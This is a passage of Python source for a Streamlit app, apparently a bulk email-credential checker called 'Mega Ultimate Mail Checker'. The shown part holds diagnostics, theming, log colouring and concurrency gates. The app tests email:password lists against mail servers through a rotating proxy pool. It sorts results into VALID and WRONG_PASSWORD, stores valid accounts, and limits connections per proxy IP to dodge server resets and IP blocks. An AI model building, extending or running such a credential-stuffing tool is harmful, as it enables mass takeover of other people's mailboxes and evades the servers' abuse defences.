    A(f"  exists            : {fa.get('exists')}")
    A(f"  total lines       : {fa.get('total')}")
    A(f"  unique lines      : {fa.get('unique')}")
    A(f"  DISTINCT IPs      : {fa.get('distinct_ips')}   <-- the number that matters")
    A(f"  DISTINCT users    : {fa.get('distinct_users')}")
    A(f"  lines with '@'    : {fa.get('with_creds')}")
    A(f"  unparsable lines  : {fa.get('unparsable')}")
    A(f"  detected formats  : {fa.get('formats')}")
    A(f"  error             : {fa.get('error', '-')}")
    A("  -- first 10 lines VERBATIM --")
    for i, l in enumerate(fa.get("sample") or []):
        A(f"    [{i}] {l}")
    A("  -- host:port -> how many lines reference it (top 20) --")
    dm = sorted((fa.get("dupe_map") or {}).items(), key=lambda kv: -kv[1])[:20]
    if dm:
        for hp, n in dm:
            A(f"    {hp:28} x{n}")
    else:
        A("    (none parsed)")

    A("")
    A("--- 4. PROBE-TARGET REACHABILITY FROM THIS APP HOST (direct, no proxy) ---")
    for r in _probe_target_reachability():
        A(f"  {r['target']:24} resolved={r.get('resolved','?'):18} "
          f"tcp={'OK' if r['ok'] else 'FAIL'} {r['ms']}ms {r['err']}")

    A("")
    A("--- 5. EGRESS IDENTITY (this app host) ---")
    try:
        g = direct_geo()
        A(f"  ip={g.get('ip')} country={g.get('country')} region={g.get('region')} vpn={g.get('vpn')}")
        A(f"  isp={direct_isp()[:120]}")
    except Exception as e:
        A(f"  geo error: {e}")

    A("")
    A("--- 6. POOL STATE ---")
    A(f"  loaded proxies      : {len(all_proxies)}")
    A(f"  filtered pool       : {len(filtered_pool)}")
    A(f"  alive pool          : {len(alive_pool)}")
    A(f"  quarantined (407)   : {quarantine_size()}")
    A(f"  probe_in_flight     : {STATE.get('probe_in_flight')}")
    A(f"  probe_runs          : {STATE.get('probe_runs')}")
    _lp = STATE.get("last_probe_ts", 0.0)
    A(f"  last_probe         : {int(time.time() - _lp)}s ago" if _lp else "  last_probe         : never")
    A(f"  process uptime      : {int(time.time() - STATE.get('process_start', time.time()))}s")
    A(f"  probe target/budget : {CFG.get('PROBE_TARGET')} / {probe_timeout():.0f}s / strict={CFG.get('PROBE_STRICT')}")
    A(f"  HOST_CONCURRENCY    : {CFG.get('HOST_CONCURRENCY')}")
    A(f"  PROXY_CONCURRENCY   : {CFG.get('PROXY_CONCURRENCY')}")
    A(f"  PROXY_IP_CONCURRENCY: {CFG.get('PROXY_IP_CONCURRENCY')}")
    A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
    A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
    A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")

    A("")
    A("--- 7. PROBE REASON HISTOGRAM (most recent probe per node) ---")
    for r, n in probe_reason_histogram().items():
        A(f"  {_PROBE_REASON_LABEL.get(r, r):16}: {n}")

    A("")
    A("--- 8. PER-NODE TABLE ---")
    A("  key | host:port | user | reason | lat_ms | attempts | country | last_error")
    with probe_stats_lock:
        psnap = dict(probe_stats)
    with proxy_lock:
        msnap = dict(proxy_meta)
    keys = sorted(set(list(psnap.keys()) + list(msnap.keys())))
    for k in keys:
        ps = psnap.get(k) or {}
        m = msnap.get(k) or {}
        info = parse_proxy(k)
        hp = f"{info['host']}:{info['port']}" if info else "UNPARSABLE"
        user = (info.get("user") if info else "") or "-"
        A(f"  {k} | {hp} | {user} | {ps.get('reason','-')} | "
          f"{ps.get('latency_ms', 0)} | {ps.get('attempts', 0)} | "
          f"{m.get('country','?')} | {ps.get('error','')}")

    A("")
    A("--- 9. QUARANTINE / CIRCUIT BREAKERS ---")
    with proxy_quarantine_lock:
        A(f"  quarantined: {sorted(proxy_quarantine)}")
    A(f"  407 strikes: {dict(_proxy_407)}")
    now = time.time()
    A(f"  circuit-broken (30s): "
      f"{ {k: f'{v - now:.0f}s left' for k, v in circuit_breaker_until.items() if v > now} }")
    A(f"  scheme memory: {dict(_proxy_scheme)}")

    A("")
    A("--- 10. CACHES & THREADS ---")
    with _tunnel_lock:
        A(f"  tunnel_cache entries: {len(_tunnel_cache)} (TTL {_TUNNEL_TTL}s)")
    with probe_stats_lock:
        A(f"  probe_stats entries : {len(probe_stats)}")
    A(f"  proxy_meta entries  : {len(proxy_meta)}")
    A(f"  geo cache entries   : {len(_GEO_CACHE)}")
    with _SMTP_LOCK:
        A(f"  smtp cache entries  : {len(_SMTP_DOMAIN_CACHE)}")
    A("  threads:")
    for t in _thread_report():
        A(f"    {t}")

    A("")
    A("--- 11. RECENT PROBE EVENTS (last 60) ---")
    with probe_log_lock:
        tail = list(probe_log)[-60:]
    for e in tail:
        A(f"  {e}")
    if not tail:
        A("  (none)")

    A("")
    A("--- 12. STARTUP LOG TAIL (last 60) ---")
    for e in startup_panel_lines()[-60:]:
        A(f"  {e}")

    A("")
    A("=" * 78)
    A("END OF DIAGNOSTIC BUNDLE")
    A("=" * 78)
    return "\n".join(L)

# ============================================================================
# THEME ENGINE
# ============================================================================

THEME_FILE = "theme.json"

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}

def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0

def default_theme() -> dict:
    p = THEME_PRESETS["Aurora"]
    return {
        "preset": "Aurora",
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True,
        "colorize_logs": True,
        "hero_title": "⚡ Mega Ultimate Mail Checker v13.29",
        "hero_sub": "World-Coverage Edition — router-aware host ranking, concurrency-governed rotating proxy pool with 407 quarantine, per-IP tunnel cap, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation, deep diagnostics.",
    }

def load_theme() -> dict:
    base = default_theme()
    if os.path.exists(THEME_FILE):
        try:
            with open(THEME_FILE, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
        except Exception:
            pass
    return base

def save_theme(th: dict):
    try:
        with open(THEME_FILE, "w", encoding="utf-8") as f:
            json.dump(th, f, indent=2)
    except Exception:
        pass

def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6

def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], th["text"]
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glow_css = f"box-shadow: 0 8px 26px {ac}44;" if th.get("glow", True) else ""
    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = f"""
    .bb-hero {{ background-size: 240% 240%; animation: bbShift 14s ease infinite; }}
    @keyframes bbShift {{ 0%{{background-position:0% 50%}} 50%{{background-position:100% 50%}} 100%{{background-position:0% 50%}} }}
    """

    return f"""
<style>
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], section.main {{ background: {bg} !important; color: {text} !important; }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    [data-testid="stSidebar"] * {{ color: {text}; }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glow_css} {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important; overflow: hidden;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{
        background: linear-gradient(90deg, {g1}, {g2}) !important;
    }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 2.0rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .95rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 24px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.25rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.03rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}

    .bb-card {{
        background: {panel}; border: 1px solid {border}; border-radius: {r}px;
        padding: 14px 18px; {glass_css}
    }}
    .bb-pill {{
        display: inline-block; padding: 2px 10px; border-radius: 999px;
        font-size: .72rem; font-weight: 800; margin-right: 6px;
        background: {ac}33; color: {ac2}; border: 1px solid {ac}55;
    }}

    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 420px; overflow-y: auto;
    }}
    .bb-log {{ padding: 1px 8px; white-space: pre-wrap; word-break: break-word; }}

    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}

    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}
    {anim_css}
</style>
"""

def render_hero(th: dict):
    title = th.get("hero_title", "⚡ Mega Ultimate Mail Checker")
    sub = th.get("hero_sub", "")
    str_lit.markdown(
        f"""
        <div class="bb-hero">
            <h1>{html.escape(title)}</h1>
            <p>{html.escape(sub)}</p>
            <div class="bb-tags">
                <span class="bb-tag">Fast</span>
                <span class="bb-tag">Normal</span>
                <span class="bb-tag">Deep / Aggressive</span>
                <span class="bb-tag">Proxy Backed</span>
                <span class="bb-tag">407 Quarantine</span>
                <span class="bb-tag">Per-IP Tunnel Cap</span>
                <span class="bb-tag">Random Rotation</span>
                <span class="bb-tag">Concurrency Governed</span>
                <span class="bb-tag">Microsoft XOAUTH2</span>
                <span class="bb-tag">Deep Diagnostics</span>
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )

def section_title(icon: str, title: str, subtitle: str = ""):
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    str_lit.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )

# ---------------------------------------------------------------------------
# LIVE EXECUTION STREAM COLOUR CONTRACT
# ---------------------------------------------------------------------------
TAG_COLORS = {
    "VALID": "#22c55e",
    "WRONG_PASSWORD": "#ef4444",
    "CONNECTION_FAILED": "#eab308",
    "PROXY_UNHEALTHY": "#e879f9",
    "NEED_APP_PASSWORD": "#3b82f6",
    "RETRY_LATER": "#ffffff",
    "RBL_BLOCKED": "#facc15",
    "SMTP_FAILED": "#a855f7",
    "DNS_FAILED": "#f97316",
    "UNKNOWN": "#94a3b8",
    "SKIPPED_COOLDOWN": "#a78bfa",
    "EXCEPTION": "#fb7185",
    "ERROR": "#fb7185",
}

def _line_color(line: str) -> str:
    up = str(line).upper()
    for tag in ("SKIPPED_COOLDOWN", "NEED_APP_PASSWORD", "RBL_BLOCKED", "WRONG_PASSWORD",
                "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER", "SMTP_FAILED",
                "DNS_FAILED", "VALID", "UNKNOWN", "EXCEPTION", "ERROR"):
        if f"[{tag}]" in up:
            return TAG_COLORS.get(tag, "#cbd5e1")
    if "[CLASSIFIED: VALID]" in up:
        return TAG_COLORS["VALID"]
    if "[CLASSIFIED: WRONG_PASSWORD]" in up:
        return TAG_COLORS["WRONG_PASSWORD"]
    if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
        return TAG_COLORS["NEED_APP_PASSWORD"]
    if "[CLASSIFIED: RBL_BLOCKED]" in up:
        return TAG_COLORS["RBL_BLOCKED"]
    if "[CLASSIFIED: RETRY_LATER]" in up:
        return TAG_COLORS["RETRY_LATER"]
    if "[CLASSIFIED: SMTP_FAILED]" in up:
        return TAG_COLORS["SMTP_FAILED"]
    if "[CLASSIFIED: DNS_FAILED]" in up:
        return TAG_COLORS["DNS_FAILED"]
    if "[CLASSIFIED: PROXY_UNHEALTHY]" in up:
        return TAG_COLORS["PROXY_UNHEALTHY"]
    if "[CLASSIFIED:" in up:
        return TAG_COLORS["CONNECTION_FAILED"]
    return ""

def colorize_logs(lines: List[str]) -> str:
    out = []
    for ln in lines or []:
        col = _line_color(ln)
        style = f"color:{col};" if col else "opacity:.85;"
        out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
    return f'<div class="bb-logbox">{"".join(out)}</div>'

def render_logs(lines: List[str], height: int = 300):
    if st.session_state.get("colorize_logs", True):
        str_lit.markdown(colorize_logs(lines), unsafe_allow_html=True)
    else:
        str_lit.code("\n".join(lines), language="text")

if "theme" not in str_lit.session_state:
    str_lit.session_state.theme = load_theme()
if "colorize_logs" not in str_lit.session_state:
    str_lit.session_state.colorize_logs = str_lit.session_state.theme.get("colorize_logs", True)

if not os.path.exists(THEME_FILE):
    save_theme(str_lit.session_state.theme)

def _sync_theme_from_widgets():
    th = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    for k in ("radius", "glow", "animate", "glass"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    th["colorize_logs"] = str_lit.session_state.get("colorize_logs", True)
    if "th_hero_title" in str_lit.session_state:
        th["hero_title"] = str_lit.session_state["th_hero_title"]
    if "th_hero_sub" in str_lit.session_state:
        th["hero_sub"] = str_lit.session_state["th_hero_sub"]
    save_theme(th)

def _on_preset_change():
    name = str_lit.session_state.get("th_preset")
    p = THEME_PRESETS.get(name)
    if p:
        for k, v in p.items():
            str_lit.session_state[f"th_{k}"] = v
        str_lit.session_state.theme["preset"] = name
        save_theme(str_lit.session_state.theme)

def _reset_theme():
    str_lit.session_state.theme = default_theme()
    d = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        str_lit.session_state[f"th_{k}"] = d[k]
    for k in ("radius", "glow", "animate", "glass"):
        str_lit.session_state[f"th_{k}"] = d[k]
    str_lit.session_state["th_preset"] = d["preset"]
    str_lit.session_state["th_hero_title"] = d["hero_title"]
    str_lit.session_state["th_hero_sub"] = d["hero_sub"]
    str_lit.session_state["colorize_logs"] = d["colorize_logs"]
    save_theme(d)

# ============================================================================
# GLOBAL STATE
# ============================================================================

DOMAIN_CACHE_TTL = 86400

TLD_COUNTRY = {
    "de": "Germany", "at": "Austria", "ch": "Switzerland", "fr": "France",
    "it": "Italy", "es": "Spain", "pt": "Portugal", "nl": "Netherlands",
    "be": "Belgium", "pl": "Poland", "se": "Sweden", "no": "Norway",
    "dk": "Denmark", "fi": "Finland", "ie": "Ireland", "cz": "Czechia",
    "sk": "Slovakia", "gr": "Greece", "ro": "Romania", "hu": "Hungary",
    "uk": "United Kingdom", "gb": "United Kingdom", "ca": "Canada",
    "us": "United States", "au": "Australia", "nz": "New Zealand",
    "br": "Brazil", "mx": "Mexico", "ar": "Argentina", "cl": "Chile",
    "jp": "Japan", "kr": "South Korea", "in": "India", "tr": "Turkey",
    "za": "South Africa", "ru": "Russia", "ua": "Ukraine", "il": "Israel",
    "lt": "Lithuania", "lv": "Latvia", "ee": "Estonia", "bg": "Bulgaria",
    "hr": "Croatia", "si": "Slovenia", "rs": "Serbia",
}

_VPN_BRANDS = (
    "vpn", "nordvpn", "mullvad", "proton", "expressvpn", "surfshark", "cyberghost",
    "private internet", "ipvanish", "windscribe", "tunnelbear", "hide.me", "purevpn",
    "astrill", "vyprvpn", "hotspot shield", "ivacy", "torguard", "perfect privacy",
    "azirevpn", "airvpn", "openvpn", "wireguard",
)

_VPN_TOKENS = _VPN_BRANDS

def load_persistent_valid_results():
    valid_list, seen = [], set()
    try:
        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            if os.path.exists(extra):
                paths.append(extra)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and email not in seen:
                                seen.add(email)
                                valid_list.append(line)
            except Exception:
                continue
    except Exception:
        pass
    return valid_list

if "engine_has_run" not in str_lit.session_state:
    str_lit.session_state.engine_has_run = False
if "valid_results" not in str_lit.session_state:
    loaded_valid = load_persistent_valid_results()
    str_lit.session_state.valid_results = loaded_valid
    str_lit.session_state.clean_valid_count = len(loaded_valid)
    str_lit.session_state.run_valid_count = len(loaded_valid)
for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
           "retry_results", "rbl_results", "smtp_results", "dns_results",
           "skip_results", "report_entries", "log_lines", "startup_entries",
           "pre_dns_failed", "pre_smtp_failed"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = []
if "zip_bytes" not in str_lit.session_state:
    str_lit.session_state.zip_bytes = None
if "zip_name" not in str_lit.session_state:
    str_lit.session_state.zip_name = ""
if "checked_emails_set" not in str_lit.session_state:
    str_lit.session_state.checked_emails_set = set()
if "last_checked_index" not in str_lit.session_state:
    str_lit.session_state.last_checked_index = 0
if "run_completion_status" not in str_lit.session_state:
    str_lit.session_state.run_completion_status = "Unfinished"
for _k in ("start_timestamp", "end_timestamp", "total_duration"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = None

_STARTUP_BUFFER = []
_STARTUP_BUFFER_LOCK = threading.Lock()

def log_startup(msg, quiet: bool = False):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{ts}] [INIT/HOOD] {msg}"
    if quiet:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)
            if len(_STARTUP_BUFFER) > 400:
                del _STARTUP_BUFFER[:-400]
        return
    try:
        if entry not in str_lit.session_state.startup_entries:
            str_lit.session_state.startup_entries.append(entry)
    except Exception:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)

def startup_panel_lines():
    try:
        main = list(str_lit.session_state.startup_entries)
    except Exception:
        main = []
    with _STARTUP_BUFFER_LOCK:
        buffered = list(_STARTUP_BUFFER)
    if not buffered:
        return main
    return main + ["", "── background thread (quiet mode) ──"] + buffered

log_startup("Application process started. Initializing session state and loading configurations...")
log_startup(f"hosts.py status -> loaded={HOSTS_OK} has_ranking={HOSTS_HAS_RANKING} merge={_HAVE_HOSTS_MERGE} {HOSTS_IMPORT_NOTE}".strip())
log_startup(f"status.py status -> {STATUS_IMPORT_NOTE}")
log_startup(f"ms_oauth.py status -> loaded={MS_OAUTH_OK} (Microsoft XOAUTH2 {'active' if MS_OAUTH_OK else 'INACTIVE'})")

cache_lock = STATE["cache_lock"]
proxy_lock = STATE["proxy_lock"]
file_write_lock = STATE["file_write_lock"]
session_state_lock = STATE["session_state_lock"]
bad_proxies = STATE["bad_proxies"]
alive_pool = STATE["alive_pool"]
alive_pool_lock = STATE["alive_pool_lock"]
consecutive_proxy_failures = STATE["consecutive_proxy_failures"]
circuit_breaker_until = STATE["circuit_breaker_until"]
failed_domain_cache = STATE["failed_domain_cache"]
_host_dns_cache = STATE["host_dns_cache"]
_host_dns_lock = STATE["host_dns_lock"]

proxy_quarantine = STATE["proxy_quarantine"]
proxy_quarantine_lock = STATE["proxy_quarantine_lock"]
_proxy_407 = STATE["strikes_407"]
_proxy_scheme = STATE["proxy_scheme"]
_proxy_scheme_lock = STATE["proxy_scheme_lock"]

_rr_lock = STATE["rr_lock"]

_GEO_CACHE = STATE["geo_cache"]
_GEO_LOCK = STATE["geo_lock"]
_PUBLIC_IP = STATE["public_ip"]
_PUBLIC_IP_LOCK = STATE["public_ip_lock"]
_DIRECT_GEO = STATE["direct_geo"]
_DIRECT_GEO_LOCK = STATE["direct_geo_lock"]
_DIRECT_ISP = STATE["direct_isp"]

_SMTP_DOMAIN_CACHE = STATE["smtp_domain_cache"]
_SMTP_LOCK = STATE["smtp_lock"]
_SMTP_CACHE_TTL = 900
_SMTP_PRECHECK_BUDGET = 45.0
_SMTP_PRECHECK_WORKERS = 32

# ============================================================================
# CONCURRENCY GOVERNORS
# ============================================================================

class _NullGate:
    def acquire(self, timeout=None):
        return True
    def release(self):
        pass

_null_gate = _NullGate()

def _proxy_gate():
    """Global cap on simultaneous proxy tunnels (persistent across reruns)."""
    g = STATE.get("proxy_gate")
    if g is None:
        try:
            limit = int(CFG.get("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT)) or PROXY_CONCURRENCY_DEFAULT
        except Exception:
            limit = PROXY_CONCURRENCY_DEFAULT
        g = threading.BoundedSemaphore(max(1, limit))
        STATE["proxy_gate"] = g
    return g

def _host_gate(host):
    """Per-destination-HOSTNAME cap so 50 workers do not slam one IMAP box."""
    if not host:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["host_gates"]
        g = gates.get(host)
        if g is None:
            try:
                limit = int(CFG.get("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT)) or HOST_CONCURRENCY_DEFAULT
            except Exception:
                limit = HOST_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[host] = g
        return g

def _ip_gate(ip):
    """v13.29: per-PROXY-IP cap.

    The pool is N LINES but far fewer distinct IPs.  HOST_CONCURRENCY caps per
    hostname, so three workers could pile onto one mail host from the SAME
    source IP - and a legacy IMAP front resets the third.  This is the cap the
    mail server actually sees.
    """
    if not ip:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["ip_gates"]
        g = gates.get(ip)
        if g is None:
            try:
                limit = int(CFG.get("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT)) or PROXY_IP_CONCURRENCY_DEFAULT
            except Exception:
                limit = PROXY_IP_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[ip] = g
        return g

def _reset_gates():
    """Rebuild every gate (called when settings are applied)."""
    with STATE["host_gate_lock"]:
        STATE["host_gates"] = {}
        STATE["ip_gates"] = {}
    STATE["proxy_gate"] = None
    log_probe_event("concurrency gates rebuilt")

@dataclass
class CheckerConfig:
    mode_name: str = "Normal"
    fast_mode: bool = False
    max_concurrent_checks: int = 50
    connect_timeout: float = 5.0
    read_timeout: float = 5.0
    max_retries: int = 2
    failure_cooldown: float = 30.0

def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in str_lit.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines() if line.strip()]
OXYLABS_PROXIES = [line.strip() for line in (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines() if line.strip()]
log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")

if "help_states" not in str_lit.session_state:
    str_lit.session_state.help_states = {}

def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    try:
        if key_name not in str_lit.session_state.help_states:
            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}

